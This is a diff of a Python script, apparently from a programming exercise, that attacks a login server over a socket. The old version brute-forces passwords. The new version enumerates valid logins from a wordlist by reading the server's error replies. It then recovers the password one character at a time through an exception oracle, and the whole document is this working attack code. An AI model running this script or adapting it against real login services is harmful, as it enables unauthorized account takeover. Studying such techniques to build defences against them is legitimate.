@@ -1,41 +1,69 @@
 import argparse
 
-import itertools
+from itertools import cycle
 
-import string
+import json
 
 import socket
 
-
-def pass_generator(length=1):
-    global ALL_SYMBOLS
-    generator = itertools.product(ALL_SYMBOLS, repeat=length)
-    for i in generator:
-        yield i
-
+import string
 
 BUF_SIZE = 1024
-ALL_SYMBOLS = string.ascii_lowercase + string.digits
+ALL_SYMBOLS = string.ascii_letters + string.digits
+
+
+def get_new_line():
+    with open('logins.txt', 'r') as file:
+        for line in file:
+            yield line.strip('\n')
+
+
+def pass_gen_v3(word=''):
+    global ALL_SYMBOLS
+    a = cycle(ALL_SYMBOLS)
+    for i in a:
+        yield word + i
+
 
 parser = argparse.ArgumentParser()
 parser.add_argument('ip_address')
 parser.add_argument('port')
 args = parser.parse_args()
-pass_gen = pass_generator()
-pass_length = 1
 m = 0
+
+login_gen = get_new_line()
+login = next(login_gen)
+request = {'login': login, 'password': ''}
+
 with socket.socket() as client_socket:
     client_socket.connect((args.ip_address, int(args.port)))
-    while m < 1_000_000:
-        try:
-            password = ''.join([x for x in next(pass_gen)])
-            client_socket.send(password.encode())
-            response = client_socket.recv(BUF_SIZE).decode()
-            if response == 'Connection success!':
-                print(password)
-                break
-            m += 1
-        except StopIteration:
-            pass_length += 1
-            pass_gen = pass_generator(pass_length)
+    # Finding login. If login correct - response is 'Wrong password!'
+    while True:
+        request['login'] = login
+        request_json = json.dumps(request, indent=4)
+        client_socket.send(request_json.encode('utf-8'))
+        response_json = client_socket.recv(BUF_SIZE).decode()
+        response = json.loads(response_json)
+        if response['result'] == 'Wrong password!':
+            break
+        else:
+            login = next(login_gen)
             continue
+    # Finding password. Start with 1 symbol, if password starts with this symbol - exception occurs.
+    # Then we are searching 2nd symbol and so on.
+    pass_gen = pass_gen_v3()
+    password = next(pass_gen)
+    while response['result'] != 'Connection success!':
+        request['password'] = password
+        request_json = json.dumps(request, indent=4)
+        client_socket.send(request_json.encode('utf-8'))
+        response_json = client_socket.recv(BUF_SIZE).decode()
+        response = json.loads(response_json)
+        if response['result'] == 'Exception happened during login':
+            pass_gen = pass_gen_v3(password)
+            password = next(pass_gen)
+            continue
+        else:
+            password = next(pass_gen)
+            continue
+print(request_json)
